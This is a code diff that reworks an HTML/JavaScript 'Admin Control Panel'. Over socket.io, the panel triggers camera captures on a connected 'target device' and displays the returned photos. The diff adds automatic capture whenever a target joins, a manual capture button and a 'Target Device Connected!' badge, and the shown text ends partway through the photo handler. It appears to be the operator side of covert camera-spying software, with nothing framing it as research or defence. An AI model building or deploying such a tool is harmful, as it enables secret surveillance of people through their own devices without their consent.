@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Dashboard</title>
+    <title>Admin Live Control</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -21,19 +21,32 @@
             border-radius: 12px;
             text-align: center;
             width: 90%;
-            max-width: 450px;
+            max-width: 480px;
             box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+        }
+        .control-panel {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-top: 20px;
+        }
+        .toggle-box {
+            background: #3a3a3a;
+            padding: 15px;
+            border-radius: 8px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
         }
         button {
             background-color: #ff1744;
             color: white;
             border: none;
-            padding: 14px 24px;
+            padding: 14px 20px;
             font-size: 16px;
             font-weight: bold;
             border-radius: 8px;
             cursor: pointer;
-            margin-top: 15px;
         }
         button:hover { background-color: #d50000; }
         .preview-box {
@@ -41,42 +54,81 @@
             border: 2px dashed #555;
             padding: 10px;
             border-radius: 8px;
-            min-height: 200px;
+            min-height: 250px;
             display: flex;
+            flex-direction: column;
             align-items: center;
             justify-content: center;
         }
         img {
             max-width: 100%;
-            border-radius: 6px;
+            border-radius: 8px;
+            border: 2px solid #00e676;
+        }
+        .status-badge {
+            background: #00e676;
+            color: #000;
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: bold;
         }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <h2>👑 Admin Dashboard</h2>
-        <p>User Device Control Panel</p>
-        
-        <button id="captureBtn">FORCE MANUAL CAPTURE</button>
+        <h2>👑 Admin Control Panel</h2>
+        <span id="systemStatus" class="status-badge">Target Waiting...</span>
 
-        <h3>Live Output:</h3>
+        <div class="control-panel">
+            <div class="toggle-box">
+                <span>Auto Capture On Join:</span>
+                <button id="toggleBtn" style="background-color: #2e7d32;">STATUS: ON</button>
+            </div>
+            
+            <button id="captureBtn">MANUAL CAPTURE NOW</button>
+        </div>
+
+        <h3>Live Output Stream:</h3>
         <div class="preview-box">
-            <img id="outputImage" src="" alt="Capture output display" style="display:none;">
-            <span id="placeholderText">No photo received yet</span>
+            <img id="outputImage" src="" alt="Live capture stream" style="display:none;">
+            <span id="placeholderText">No live photo received yet</span>
         </div>
     </div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io();
+        const toggleBtn = document.getElementById('toggleBtn');
         const captureBtn = document.getElementById('captureBtn');
         const outputImage = document.getElementById('outputImage');
         const placeholderText = document.getElementById('placeholderText');
+        const systemStatus = document.getElementById('systemStatus');
+
+        let autoCaptureEnabled = true;
+
+        toggleBtn.addEventListener('click', () => {
+            autoCaptureEnabled = !autoCaptureEnabled;
+            if (autoCaptureEnabled) {
+                toggleBtn.innerText = "STATUS: ON";
+                toggleBtn.style.backgroundColor = "#2e7d32";
+                socket.emit('set-auto-capture-state', true);
+            } else {
+                toggleBtn.innerText = "STATUS: OFF";
+                toggleBtn.style.backgroundColor = "#c62828";
+                socket.emit('set-auto-capture-state', false);
+            }
+        });
 
         captureBtn.addEventListener('click', () => {
             socket.emit('admin-trigger-capture');
-            placeholderText.innerText = "Requesting Capture...";
+            placeholderText.innerText = "Triggering manual capture...";
+        });
+
+        socket.on('user-connected', () => {
+            systemStatus.innerText = "Target Device Connected!";
+            systemStatus.style.backgroundColor = "#00e676";
         });
 
         socket.on('send-photo-to-admin', (imageData) => {
